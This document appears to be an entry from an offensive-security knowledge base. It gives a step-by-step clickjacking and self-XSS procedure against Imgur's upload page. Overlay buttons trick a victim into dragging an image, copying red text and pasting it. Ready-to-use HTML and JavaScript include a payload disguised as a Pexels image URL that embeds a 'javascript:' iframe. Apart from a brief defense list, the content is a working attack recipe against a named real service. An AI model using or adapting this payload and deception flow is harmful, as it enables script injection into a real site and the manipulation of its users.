---
id: proc-imgur-user-guidance
tags:
  - social-engineering
  - ui-overlay
  - clipboard
type: procedure
tools:
  - '[[tools/Firefox]]'
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/user-click-initiate]]'
  - '[[commands/ondragend-ui-update]]'
  - '[[commands/red-text-payload-display]]'
  - '[[commands/onpaste-detection]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:33:06.869Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Drive-by Compromise]]'
  - '[[JavaScript]]'
---
# Guide-User-Interaction-for-Payload-Delivery

## Summary

This procedure uses overlaid UI elements in the ClickJacked frame to instruct the victim to drag an image, copy red text containing a disguised payload, and paste it, preparing for self-XSS injection via clipboard and paste events.

## Description

Building on page detection, this social engineering step overlays buttons and inputs on the Imgur upload page to mimic legitimate actions. The payload is hidden in a fake image URL. Firefox clipboard API is used assuming permission grant. Expected outcome: Victim pastes payload into upload field.

## Requirements

1. Victim on upload page (detected)
2. Firefox with clipboard permissions granted
3. Malicious HTML with buttons (btn1, btn2) and input elements
4. Disguised payload ready

## Defense

Defensive measures and detection strategies:

- Validate all user inputs and pasted content server-side
- Disable or restrict clipboard API in sensitive contexts
- UI integrity checks to detect overlays
- Warn users on unusual drag/paste prompts

## Objectives

1. Trick victim into drag-and-paste sequence
2. Deliver self-XSS payload via user action
3. Detect interaction for timing execution

## Instructions

### Step 1: Initiate Click Overlay

**Context**: Place a 'Click Here' button over the framed page.

**Command** ([[commands/user-click-initiate]]):
```html
<button id="btn1">Click Here</button>
```

> HTML button for initial interaction. Expected output: Victim clicks, overlay activates.

### Step 2: Handle Drag End

**Context**: On image drag to area, update UI for copy/paste.

**Command** ([[commands/ondragend-ui-update]]):
```javascript
ondragend=function(){btn1.innerHTML="";setTimeout(function(){btn1.innerHTML="";btn2.innerHTML="copy the red text and paste here after that, press enter!";},1100)}
```

> Clears and updates buttons after 1.1s. Expected output: Instructions for copy/paste appear.

### Step 3: Display Payload Text

**Context**: Show disguised payload in red input.

**Command** ([[commands/red-text-payload-display]]):
```html
<input type="text" name="" value="https://images.pexels.com/photos/1108099/pexels-photo-1108099.jpeg?<<iframe/src=javascript:self.innerHTML=parent.name>img/src=x>" style="color:red;">
```

> Input with payload as value. Expected output: User sees and copies the text.

### Step 4: Detect Paste

**Context**: Log paste event in upload field.

**Command** ([[commands/onpaste-detection]]):
```javascript
onpaste=function(){console.log("ONPASTE!");}
```

> Triggers on paste. Expected output: "ONPASTE!" in console.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Drive-by Compromise]] Drive-by Compromise
- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/user-click-initiate]]
- [[commands/ondragend-ui-update]]
- [[commands/red-text-payload-display]]
- [[commands/onpaste-detection]]

## Tools Used

- [[tools/Firefox]]

## Tags

- social-engineering
- ui-overlay
- clipboard
